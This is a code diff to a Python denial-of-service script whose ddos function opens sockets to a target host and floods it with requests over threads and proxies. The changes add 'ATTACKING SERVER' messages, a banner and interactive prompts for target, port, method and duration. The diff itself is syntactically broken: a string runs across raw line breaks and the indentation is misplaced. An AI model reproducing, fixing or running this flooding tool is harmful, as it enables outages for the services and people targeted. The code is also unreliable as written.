@@ -39,6 +39,9 @@ def ddos(ip, port, method, duration):
             s.connect((ip, port))
             while time.time() - start_time < duration:
                 s.sendall(request.encode())
+                print("\033[91m[ + ] ATTACKING SERVER !!")
+
+                
 
         if method == "TCP":
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,6 +49,7 @@ def ddos(ip, port, method, duration):
             s.connect((ip, port))
             while time.time() - start_time < duration:
                 s.sendall(request.encode())
+                print("\033[91m[ + ] ATTACKING SERVER !!")
 
     except ConnectionResetError:
         pass
@@ -67,14 +71,21 @@ if __name__ == "__main__":
         https = proxy_file.readlines()
 
     if len(sys.argv) != 5:
-        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <method> <time>")
-        sys.exit(1)
+print ("\033[97m
+\033[40m 
 
-    ip = sys.argv[1]
-    port = int(sys.argv[2])
-    method = sys.argv[3]
-    duration = int(sys.argv[4])
+▒█▀▀▀ █▀▀█ ▒█▄░▒█ ▒█▀▀▄ ▒█░░▒█ 
+▒█▀▀▀ ░░▀▄ ▒█▒█▒█ ▒█░▒█ ▒█▄▄▄█ 
+▒█░░░ █▄▄█ ▒█░░▀█ ▒█▄▄▀ ░░▒█░░
 
+")
+
+ip = str(input("\033[91mHOST OR IP :"))
+port = int(input("\033[91mPORT :"))
+method = str(input("\033[91mMETHOD :"))
+duration = int(input("\033[91mDURATION :"))
+
+  
     threads = []
 
     with ThreadPoolExecutor(max_workers=100) as executor:
